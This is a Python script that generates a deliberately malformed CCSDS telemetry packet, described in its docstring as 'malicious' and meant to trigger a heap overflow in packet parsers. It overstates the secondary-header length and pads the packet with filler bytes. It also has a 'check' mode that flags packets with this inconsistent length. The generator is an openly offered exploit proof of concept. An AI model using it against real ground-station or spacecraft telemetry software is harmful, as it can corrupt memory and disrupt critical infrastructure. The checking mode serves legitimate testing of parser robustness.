#!/usr/bin/env python3
import sys
import struct

def generate_evil_packet(secondary_header_offset: int = 6,
                         length_field_size: int = 2,
                         overflow_amount: int = 1024) -> bytes:
    """
    Generates a malicious TM packet triggering heap overflow.
    
    Args:
        secondary_header_offset: Position of length field (default CCSDS primary header size)
        length_field_size: Bytes used for length field (default 2)
        overflow_amount: How many bytes to overflow (minimum 1)
    
    Returns:
        bytes: Generated malicious packet
    """
    
    packet = b"\x00\x00\x00\x00\x00\x00"  # 6-byte primary header
    
    # Insert malicious secondary header length
    evil_length = len(packet) + overflow_amount + length_field_size
    length_bytes = evil_length.to_bytes(length_field_size, 'big')
    
    # Build packet
    packet = (
        packet[:secondary_header_offset] +
        length_bytes +
        b"A" * overflow_amount  
    )
    
    return packet

def check_packet(packet: bytes, 
                 secondary_header_offset: int = 6,
                 length_field_size: int = 2) -> bool:
    """
    Enhanced vulnerability checker with CCSDS awareness.
    """
    total_length = len(packet)
    
    if total_length < secondary_header_offset + length_field_size:
        print("[!] Packet too short for header analysis")
        return False

    try:
        length_data = packet[secondary_header_offset:secondary_header_offset+length_field_size]
        secondary_header_length = int.from_bytes(length_data, 'big')
    except Exception as e:
        print(f"[!] Length field error: {str(e)}")
        return False

    # Calculate available space AFTER length field
    available_space = total_length - (secondary_header_offset + length_field_size)
    
    print(f"[*] Total packet length: {total_length} bytes")
    print(f"[*] Claimed secondary header length: {secondary_header_length} bytes")
    print(f"[*] Available data space: {available_space} bytes")

    if secondary_header_length > available_space:
        print("[+] VULNERABLE - Heap overflow condition detected!")
        return True
    else:
        print("[-] Packet appears normal")
        return False

def main():
    if len(sys.argv) not in (2, 3):
        print(f"Usage: {sys.argv[0]} <check|generate> [overflow_amount]")
        print("Example:")
        print(f"  {sys.argv[0]} check 1a2b3c4d")
        print(f"  {sys.argv[0]} generate 2048")
        sys.exit(1)

    mode = sys.argv[1]
    
    if mode == "check":
        if len(sys.argv) != 3:
            print("Missing hex packet for check mode")
            sys.exit(1)
            
        try:
            packet = bytes.fromhex(sys.argv[2])
        except ValueError as e:
            print(f"Invalid hex: {str(e)}")
            sys.exit(1)
            
        # CCSDS-aware parameters
        check_packet(packet, secondary_header_offset=6, length_field_size=2)
        
    elif mode == "generate":
        overflow = 1024  
        if len(sys.argv) == 3:
            try:
                overflow = int(sys.argv[2])
            except ValueError:
                print("Invalid overflow amount, using default 1024")
                
        evil_packet = generate_evil_packet(overflow_amount=overflow)
        print(f"Generated evil packet (hex): {evil_packet.hex()}")
        
    else:
        print(f"Invalid mode: {mode}")
        sys.exit(1)

if __name__ == "__main__":
    main()